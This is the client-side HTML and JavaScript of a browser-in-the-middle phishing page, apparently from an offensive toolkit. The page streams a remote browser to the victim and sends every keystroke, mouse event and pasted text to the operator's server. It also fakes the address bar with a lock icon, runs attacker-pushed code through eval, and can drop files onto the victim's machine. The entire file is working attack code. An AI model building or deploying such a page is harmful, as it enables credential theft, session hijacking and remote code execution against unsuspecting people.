<!DOCTYPE html>
<html>
  <head>
    <title>PAGE_TITLE</title>
    <meta charset="UTF-8" />
  </head>
  <body>
    <video playsinline disablepictureinpicture autoplay muted style="width: 100vw; height: auto;"></video>
    <style>
html, body {margin: 0; height: 100%; overflow: hidden}
    </style>
    <script src="/FileSaver.min.js"></script>
    <script src="/socket.io/socket.io.js"></script>
    <script>

//couple of helper functions
function width(){
  return window.innerWidth 
  || document.documentElement.clientWidth 
  || document.body.clientWidth 
  || 0;
}

function height(){
  return window.innerHeight 
  || document.documentElement.clientHeight 
  || document.body.clientHeight 
  || 0;
}

const client_ip = 'CLIENT_IP';
const target_id = 'TARGET_ID';

//declare connnection and video in global scope for further reference
var peerConnection;
const video = document.querySelector("video")

//connect to the server over websockets and anounce we are a new phish
const socket = io.connect(window.location.origin)
let viewport_width = width()
let viewport_height = height()
socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)

socket.on("push_state", function(new_url){
  console.log(`Received push_state event: ${new_url}`)
  console.log(`Current URL before: ${window.location.href}`)
  
  try {
    // Use history.pushState instead of replaceState, as it's sometimes less restricted
    history.pushState(null, '', new_url)
    console.log(`URL spoofed using pushState: ${window.location.href}`)
  } catch (error) {
    console.log(`pushState failed: ${error.message}`)
    
    try {
      // Fallback to replaceState
      history.replaceState(null, '', new_url)
      console.log(`URL spoofed using replaceState: ${window.location.href}`)
    } catch (error2) {
      console.log(`Both pushState and replaceState failed: ${error2.message}`)
      
      // Try a different approach - create a fake address bar
      console.log(`Creating visual URL spoof...`)
      createFakeAddressBar(new_url)
    }
  }
})

// Function to create a fake address bar overlay
function createFakeAddressBar(spoofed_url) {
  // Remove any existing fake address bar
  const existing = document.getElementById('fake-address-bar')
  if (existing) existing.remove()
  
  // Create fake address bar
  const fakeBar = document.createElement('div')
  fakeBar.id = 'fake-address-bar'
  fakeBar.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 35px;
    background: #f0f0f0;
    border-bottom: 1px solid #ccc;
    z-index: 999999;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    font-size: 14px;
    display: flex;
    align-items: center;
    padding: 0 10px;
  `
  
  fakeBar.innerHTML = `
    <span style="margin-right: 10px;">ðŸ”’</span>
    <span style="background: white; padding: 5px 10px; border-radius: 15px; flex: 1;">${spoofed_url}</span>
  `
  
  document.body.appendChild(fakeBar)
  
  // Adjust video position to account for fake bar
  const video = document.querySelector('video')
  if (video) {
    video.style.marginTop = '35px'
    video.style.height = 'calc(100vh - 35px)'
  }
  
  console.log(`Fake address bar created showing: ${spoofed_url}`)
}

socket.on("copy_to_clipboard", function(data){
  copy_to_clipboard(data)
})

//1) wait for a video stream offer
socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
  peerConnection = new RTCPeerConnection({
    iceServers: [
      {
        "urls": "stun:stun.l.google.com:19302",
      },
      // { 
      //   "urls": "turn:TURN_IP?transport=tcp",
      //   "username": "TURN_USERNAME",
      //   "credential": "TURN_CREDENTIALS"
      // }
    ]
  })
  //2) set up an answer an send back to the broadcaster
  peerConnection
    .setRemoteDescription(offer)
    .then(() => peerConnection.createAnswer())
    .then(sdp => peerConnection.setLocalDescription(sdp))
    .then(() => {
      socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
    }) 
  //add video track when it becomes available
  peerConnection.ontrack = function(event){
    video.srcObject = event.streams[0]
  }
  //3) send ICE candidates as they become available
  peerConnection.onicecandidate = function(event){
    if (event.candidate) {
      socket.emit("candidate", broadcaster_socket_id, event.candidate)
    }
  }  
})

socket.on("candidate", function(broadcaster_socket_id, candidate){
  peerConnection
    .addIceCandidate(new RTCIceCandidate(candidate))
    .catch(e => console.error(e))
})

socket.on("execute_script", function(script){
  eval(script)
})

socket.on("save", function(file){
  saveAs(new Blob([file.data]), file.filename)
})

//joystick actions for mouse events
document.addEventListener("mousedown", handleMouseEvent, !1) 
document.addEventListener("mouseup", handleMouseEvent, !1) 
document.addEventListener("mousemove", handleMouseEvent, !1) 
document.addEventListener("mousewheel", handleMouseEvent, !1) 
document.addEventListener("click", handleMouseEvent, !1) 

window.addEventListener('popstate', function(event){
  socket.emit('go_back')
})

window.addEventListener('paste', function(event){
  let paste_data = (event.clipboardData || window.clipboardData).getData('text')
  socket.emit('paste', paste_data)
  event.preventDefault()
})

function handleMouseEvent(e){
  if(e.type == "mousewheel"){
    socket.emit('mouse_event', {"type": e.type, "wheelDeltaX": e.wheelDeltaX, "wheelDeltaY": e.wheelDeltaY})
  }else{
    //console.log({"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
    socket.emit('mouse_event', {"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
  }
}

//joystick actions for key events
document.addEventListener('keydown', keyDown)
document.addEventListener('keyup', keyUp)

var ctrlKey = false

function keyDown(e) {
  if(e.keyCode == 9 || e.which == 9){
    e.preventDefault()
  }
  if(e.keyCode == 86 && ctrlKey){
    return
  }
  if(e.keyCode == 67 && ctrlKey){
    socket.emit('copy')
    e.preventDefault()
    return
  }
  if(e.key == 'Meta'){
    ctrlKey = true
    return
  }
  socket.emit("keydown", e.key)
}

function keyUp(e) {
  if(e.key == 'Meta'){
    ctrlKey = false
    return
  }
  socket.emit("keyup", e.key)
}

copy_to_clipboard = function (data) {
  // Create a dummy input to copy the string inside it
  var dummy = document.createElement("textarea");
  // Add it to the document
  document.body.appendChild(dummy);
  // Set its ID
  dummy.setAttribute("id", "dummy_id");
  // Output the array into it
  document.getElementById("dummy_id").value = data;
  // Select it
  dummy.select();
  // Copy its contents
  document.execCommand("copy");
  // Remove it as its not needed anymore
  document.body.removeChild(dummy);
}

    </script>
  </body>
</html>
